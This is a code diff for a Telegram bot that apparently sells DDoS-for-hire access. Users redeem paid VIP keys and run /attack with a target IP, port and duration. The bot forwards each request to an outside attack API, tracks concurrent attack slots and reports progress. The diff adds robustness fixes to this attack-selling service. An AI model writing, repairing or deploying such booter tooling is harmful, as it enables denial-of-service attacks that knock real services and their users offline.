@@ -18,19 +18,33 @@ bot = telebot.TeleBot(TOKEN, parse_mode="Markdown")
 active_attacks = []
 MAX_CONCURRENT = 2
 
-def load_db(file):
-    if os.path.exists(file):
+# --- ROBUST DATABASE SYSTEM ---
+BASE_DIR = os.path.dirname(os.path.abspath(__file__))
+USERS_FILE = os.path.join(BASE_DIR, "users.json")
+KEYS_FILE = os.path.join(BASE_DIR, "keys.json")
+
+def load_db(file_path):
+    if os.path.exists(file_path):
         try:
-            with open(file, "r") as f: return json.load(f)
-        except: return {}
+            with open(file_path, "r") as f:
+                content = f.read().strip()
+                return json.loads(content) if content else {}
+        except Exception:
+            return {}
     return {}
 
-def save_db(file, data):
-    with open(file, "w") as f: json.dump(data, f, indent=4)
+def save_db(file_path, data):
+    try:
+        with open(file_path, "w") as f:
+            json.dump(data, f, indent=4)
+    except Exception as e:
+        print(f"Error saving DB: {e}")
 
-users = load_db("users.json")
-keys = load_db("keys.json")
+# Initial Load
+users = load_db(USERS_FILE)
+keys = load_db(KEYS_FILE)
 
+# --- UTILS ---
 def get_progress_bar(remaining, total):
     filled = int(((total - remaining) / total) * 10)
     bar = "▓" * filled + "░" * (10 - filled)
@@ -44,14 +58,15 @@ def send_attack_request(target, port, duration):
             timeout=15
         )
         return response.status_code == 200
-    except: return False
+    except:
+        return False
 
 def update_progress(chat_id, msg_id, target, port, duration):
     start_time = time.time()
     success = send_attack_request(target, port, duration)
     
     if not success:
-        bot.edit_message_text("❌ **API SERVER ERROR**\nCheck API status or key.", chat_id, msg_id)
+        bot.edit_message_text("❌ **API SERVER ERROR**\nAttack failed to trigger.", chat_id, msg_id)
         global active_attacks
         active_attacks = [a for a in active_attacks if a['target'] != target]
         return
@@ -69,23 +84,30 @@ def update_progress(chat_id, msg_id, target, port, duration):
                 f"💥 **POWERED BY SASTA DEVELOPER**",
                 chat_id, msg_id
             )
-        except: break
+        except:
+            break
         time.sleep(5)
     
     try:
-        bot.edit_message_text(f"✅ **ATTACK COMPLETE**\nTarget `{target}` successfully finished.", chat_id, msg_id)
-    except: pass
+        bot.edit_message_text(f"✅ **ATTACK COMPLETE**\nTarget `{target}` finished.", chat_id, msg_id)
+    except:
+        pass
     active_attacks[:] = [a for a in active_attacks if a['target'] != target]
+
+# --- HANDLERS ---
 
 @bot.message_handler(commands=['start'])
 def start(message):
     uid = str(message.from_user.id)
     uname = f"@{message.from_user.username}" if message.from_user.username else "NoUsername"
-    if uid not in users: users[uid] = {"expiry": 0, "username": uname}
-    save_db("users.json", users)
+    
+    current_users = load_db(USERS_FILE)
+    if uid not in current_users:
+        current_users[uid] = {"expiry": 0, "username": uname}
+        save_db(USERS_FILE, current_users)
 
     slots = f"{len(active_attacks)}/{MAX_CONCURRENT}"
-    role = "👑 ADMIN" if int(uid) == ADMIN_ID else "⭐ VIP" if users[uid]['expiry'] > time.time() else "🆓 FREE"
+    role = "👑 ADMIN" if int(uid) == ADMIN_ID else "⭐ VIP" if current_users.get(uid, {}).get('expiry', 0) > time.time() else "🆓 FREE"
     
     dashboard = (
         "🚀 **SASTA DEVELOPER TERMINAL** 🚀\n"
@@ -107,45 +129,26 @@ def start(message):
 @bot.message_handler(commands=['attack'])
 def attack_cmd(message):
     uid = str(message.from_user.id)
-    if users.get(uid, {}).get('expiry', 0) < time.time() and int(uid) != ADMIN_ID:
+    current_users = load_db(USERS_FILE)
+    
+    if current_users.get(uid, {}).get('expiry', 0) < time.time() and int(uid) != ADMIN_ID:
         bot.reply_to(message, "🚫 **VIP REQUIRED**\nRedeem a key first."); return
     if len(active_attacks) >= MAX_CONCURRENT:
         bot.reply_to(message, "⚠️ **SLOTS FULL**"); return
 
     try:
         args = message.text.split()
+        if len(args) < 4:
+            bot.send_message(message.chat.id, "📝 **Usage:** `/attack <IP> <PORT> <TIME>`")
+            return
         target, port, duration = args[1], args[2], int(args[3])
+        if duration > 300: duration = 300
+        
         active_attacks.append({"target": target, "end_time": time.time() + duration})
         msg = bot.send_message(message.chat.id, "🛰️ **Initializing Terminal...**")
         threading.Thread(target=update_progress, args=(message.chat.id, msg.message_id, target, port, duration)).start()
     except:
-        bot.send_message(message.chat.id, "📝 **Usage:** `/attack <IP> <PORT> <TIME>`")
-
-@bot.message_handler(commands=['running'])
-def running(message):
-    active_attacks[:] = [a for a in active_attacks if a['end_time'] > time.time()]
-    if not active_attacks:
-        bot.reply_to(message, "✨ **No active attacks.**"); return
-    txt = f"🔥 **LIVE SLOTS: {len(active_attacks)}/{MAX_CONCURRENT}**\n\n"
-    for a in active_attacks:
-        rem = int(a['end_time'] - time.time())
-        txt += f"🚀 `{a['target']}` | `{rem}s` left\n"
-    bot.send_message(message.chat.id, txt)
-
-@bot.message_handler(commands=['genkey'])
-def genkey(message):
-    if message.from_user.id != ADMIN_ID: return
-    try:
-        args = message.text.split()
-        days, count = int(args[1]), int(args[2])
-        new_keys = []
-        for _ in range(count):
-            k = "SD-" + ''.join(random.choices(string.ascii_uppercase + string.digits, k=8))
-            keys[k] = {"duration": days * 86400, "used_by": None}
-            new_keys.append(k)
-        save_db("keys.json", keys)
-        bot.send_message(message.chat.id, f"🎫 **KEYS:**\n`" + "\n".join(new_keys) + "`")
-    except: bot.reply_to(message, "Usage: `/genkey 1 5`")
+        bot.send_message(message.chat.id, "⚠️ **Invalid Attack Format.**")
 
 @bot.message_handler(commands=['redeem'])
 def redeem(message):
@@ -155,15 +158,49 @@ def redeem(message):
         if len(parts) < 2:
             bot.reply_to(message, "📝 **Usage:** `/redeem <KEY>`")
             return
-        k = parts[1]
-        if k in keys and keys[k]['used_by'] is None:
-            users[uid]['expiry'] = max(users.get(uid, {}).get('expiry', 0), time.time()) + keys[k]['duration']
-            keys[k]['used_by'] = f"@{message.from_user.username}" if message.from_user.username else "NoUsername"
-            save_db("users.json", users); save_db("keys.json", keys)
-            bot.reply_to(message, "👑 **VIP ACTIVATED!**")
+        
+        input_key = parts[1].strip()
+        current_keys = load_db(KEYS_FILE)
+        current_users = load_db(USERS_FILE)
+        
+        if input_key in current_keys:
+            if current_keys[input_key]['used_by'] is None:
+                if uid not in current_users:
+                    current_users[uid] = {"expiry": 0, "username": f"@{message.from_user.username}" if message.from_user.username else str(uid)}
+                
+                now = time.time()
+                old_expiry = current_users[uid].get('expiry', 0)
+                current_users[uid]['expiry'] = max(old_expiry, now) + current_keys[input_key]['duration']
+                
+                current_keys[input_key]['used_by'] = f"@{message.from_user.username}" if message.from_user.username else str(uid)
+                
+                save_db(USERS_FILE, current_users)
+                save_db(KEYS_FILE, current_keys)
+                bot.reply_to(message, "👑 **VIP ACCESS GRANTED!**")
+            else:
+                bot.reply_to(message, f"❌ **Key already used by {current_keys[input_key]['used_by']}**")
         else:
-            bot.reply_to(message, "❌ **Invalid or Used Key.**")
-    except: bot.reply_to(message, "⚠️ Redeem error.")
+            bot.reply_to(message, "❌ **Invalid Key.**")
+    except Exception:
+        bot.reply_to(message, "⚠️ **Redeem System Error.**")
 
-print("v10.7 RAILWAY STABLE ONLINE...")
+# --- ADMIN COMMANDS ---
+@bot.message_handler(commands=['genkey'])
+def genkey(message):
+    if message.from_user.id != ADMIN_ID: return
+    try:
+        args = message.text.split()
+        days, count = int(args[1]), int(args[2])
+        current_keys = load_db(KEYS_FILE)
+        new_keys_list = []
+        for _ in range(count):
+            k = "SD-" + ''.join(random.choices(string.ascii_uppercase + string.digits, k=8))
+            current_keys[k] = {"duration": days * 86400, "used_by": None}
+            new_keys_list.append(k)
+        save_db(KEYS_FILE, current_keys)
+        bot.send_message(message.chat.id, f"🎫 **KEYS GENERATED:**\n`" + "\n".join(new_keys_list) + "`")
+    except:
+        bot.reply_to(message, "Usage: `/genkey <days> <count>`")
+
+print("v10.8 FINAL FIXED ONLINE...")
 bot.infinity_polling()
